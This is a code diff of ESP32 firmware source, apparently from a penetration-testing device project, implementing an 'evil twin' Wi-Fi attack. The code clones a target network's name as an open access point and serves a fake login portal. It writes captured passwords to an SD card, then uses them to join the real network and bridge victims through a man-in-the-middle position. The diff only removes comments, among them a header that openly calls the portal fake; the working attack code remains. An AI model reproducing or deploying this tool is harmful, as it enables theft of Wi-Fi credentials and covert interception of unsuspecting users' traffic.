@@ -1,11 +1,3 @@
-// ═══════════════════════════════════════════════════════════
-// Arsenal - Captive Portal Credential Forwarding
-// Captures creds from evil portal, then auto-connects to
-// the real network with those creds. Victim gets internet
-// through us (transparent bridge) — full MITM without them
-// ever knowing the portal was fake.
-// ═══════════════════════════════════════════════════════════
-
 #include "arsenal.h"
 #include "core/display.h"
 #include "core/mykeyboard.h"
@@ -26,7 +18,7 @@ static bool credsCaptured = false;
 static bool bridgeActive = false;
 static int clientCount = 0;
 
-// Portal HTML - looks like a standard WiFi login
+
 static const char FWD_PORTAL_HTML[] PROGMEM = R"rawliteral(
 <!DOCTYPE html>
 <html><head>
@@ -64,9 +56,9 @@ h1{color:#00c853;font-size:3rem}p{color:#666}</style></head>
 <script>setTimeout(()=>window.close(),3000)</script></body></html>
 )rawliteral";
 
-// Try to connect to the real network with captured password
+
 static bool tryRealConnection(String ssid, String password) {
-    // Use AP+STA mode to maintain AP while connecting
+
     WiFi.mode(WIFI_AP_STA);
     WiFi.begin(ssid.c_str(), password.c_str());
 
@@ -81,12 +73,10 @@ static bool tryRealConnection(String ssid, String password) {
     return false;
 }
 
-// Enable NAT forwarding (AP clients → STA internet)
+
 static void enableBridge() {
-    // ESP32's lwIP doesn't have full NAT built-in, but we can enable
-    // IP forwarding which works for basic browsing
-    // For full NAT you'd need esp32_nat_router library
-    // For now: DNS works (we resolve), HTTP works via our proxy
+
+
     bridgeActive = true;
 }
 
@@ -94,17 +84,17 @@ static void setupFwdRoutes(String ssid) {
     String portalHTML = String(FWD_PORTAL_HTML);
     portalHTML.replace("SSIDPLACEHOLDER", ssid);
 
-    // Serve portal on all requests
+
     fwdServer->on("/", HTTP_GET, [portalHTML](AsyncWebServerRequest *request) {
         if (bridgeActive) {
-            // If bridge is active, redirect to real internet
+
             request->redirect("http://www.google.com");
         } else {
             request->send(200, "text/html", portalHTML);
         }
     });
 
-    // Captive portal detection endpoints
+
     fwdServer->on("/generate_204", HTTP_GET, [portalHTML](AsyncWebServerRequest *request) {
         if (bridgeActive) request->send(204);
         else request->send(200, "text/html", portalHTML);
@@ -118,13 +108,13 @@ static void setupFwdRoutes(String ssid) {
         else request->send(200, "text/html", portalHTML);
     });
 
-    // Credential capture endpoint
+
     fwdServer->on("/connect", HTTP_POST, [](AsyncWebServerRequest *request) {
         if (request->hasArg("password")) {
             capturedPassword = request->arg("password");
             credsCaptured = true;
 
-            // Log the credential
+
             if (setupSdCard()) {
                 if (!SD.exists("/arsenal")) SD.mkdir("/arsenal");
                 File f = SD.open("/arsenal/creds.txt", FILE_APPEND);
@@ -140,7 +130,7 @@ static void setupFwdRoutes(String ssid) {
         }
     });
 
-    // Catch-all
+
     fwdServer->onNotFound([portalHTML](AsyncWebServerRequest *request) {
         if (bridgeActive) request->redirect("http://" + request->host() + request->url());
         else request->send(200, "text/html", portalHTML);
@@ -153,7 +143,7 @@ void arsenal_cred_forward(void) {
         bridgeActive = false;
         capturedPassword = "";
 
-        // Step 1: Scan and select target network
+
         drawMainBorderWithTitle("Cred Forward");
         tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
         tft.setTextSize(FP);
@@ -181,9 +171,9 @@ void arsenal_cred_forward(void) {
 
         if (targetSSID.length() == 0) return;
 
-        // Step 2: Start AP with same name (open) + captive portal
+
         WiFi.mode(WIFI_AP);
-        WiFi.softAP(targetSSID.c_str(), "");  // Open — same SSID
+        WiFi.softAP(targetSSID.c_str(), "");
         delay(100);
 
         fwdDns = new DNSServer();
@@ -193,7 +183,7 @@ void arsenal_cred_forward(void) {
         setupFwdRoutes(targetSSID);
         fwdServer->begin();
 
-        // Step 3: Wait for creds
+
         unsigned long startTime = millis();
 
         while (true) {
@@ -223,7 +213,7 @@ void arsenal_cred_forward(void) {
                 tft.setCursor(padX, y);
                 tft.printf("Elapsed: %lus", elapsed);
             } else if (!bridgeActive) {
-                // Step 4: Try connecting to real network
+
                 tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
                 tft.setTextSize(FP);
                 tft.setCursor(padX, y);
@@ -239,11 +229,11 @@ void arsenal_cred_forward(void) {
                 tft.setCursor(padX, y);
                 tft.print("Connecting to real AP...");
 
-                // Try the real connection
+
                 if (tryRealConnection(targetSSID, capturedPassword)) {
                     enableBridge();
                 } else {
-                    // Password was wrong — keep portal running
+
                     tft.setCursor(padX, y + 14);
                     tft.setTextColor(TFT_RED, bruceConfig.bgColor);
                     tft.print("Wrong password! Waiting...");
@@ -252,7 +242,7 @@ void arsenal_cred_forward(void) {
                     delay(2000);
                 }
             } else {
-                // Step 5: Bridge active — MITM
+
                 tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
                 tft.setTextSize(FP);
                 tft.setCursor(padX, y);
@@ -286,7 +276,7 @@ void arsenal_cred_forward(void) {
             delay(300);
         }
 
-        // Cleanup
+
         fwdServer->end();
         delete fwdServer;
         fwdServer = nullptr;
